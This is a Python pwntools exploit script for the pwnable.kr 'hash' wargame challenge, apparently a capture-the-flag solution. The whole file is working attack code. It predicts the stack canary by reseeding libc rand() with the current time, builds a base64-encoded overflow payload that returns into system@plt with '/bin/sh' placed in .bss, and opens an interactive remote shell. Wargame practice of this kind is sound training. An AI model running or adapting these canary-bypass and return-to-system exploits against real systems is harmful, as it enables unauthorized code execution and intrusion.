from pwn import *
from ctypes import *
from time import time
import base64 as bs

context(os="linux", arch="i386")
context.log_level = "debug"

libc = CDLL("libc.so.6")

if args.LOCAL:
    # io = remote("127.1", 9002)
    io = process("./hash")
else:
    io = remote("pwnable.kr", 9002)

io.recvuntil(b"captcha : ")
captcha = io.recvline()[:-1]

# p = process(["./calcCanary", captcha])
# canary = int(p.recvline().split(b":")[1][:-1])
libc.srand(int(time()))
rv = [libc.rand() for _ in range(8)]
canary = int(captcha) - (rv[4] - rv[6] + rv[7] + rv[2] - rv[3] + rv[1] + rv[5])
log.info("canary=%#x" % canary)
# p.close()

io.sendline(captcha)

pad_len = 0x200
system_plt = 0x08048880
bss_buf = 0x0804B0E0

payload = flat([
    'A'*pad_len, 
    canary, 
    'B'*8,
    0xdeadbeef, # fake ebp 
    system_plt, 
    0xdeadbeef, # invalid retaddr of system
    bss_buf + (0x21c+2) // 3 * 4 + 1
])

payload = bs.b64encode(payload)
log.info("len(payload)=%#x" % len(payload))
assert(len(payload) == ((0x21c+2) // 3 * 4))
payload += b'\0/bin/sh\0'

pause()

io.sendlineafter(b"paste me!\n", payload)
# io.send(payload)

io.interactive()

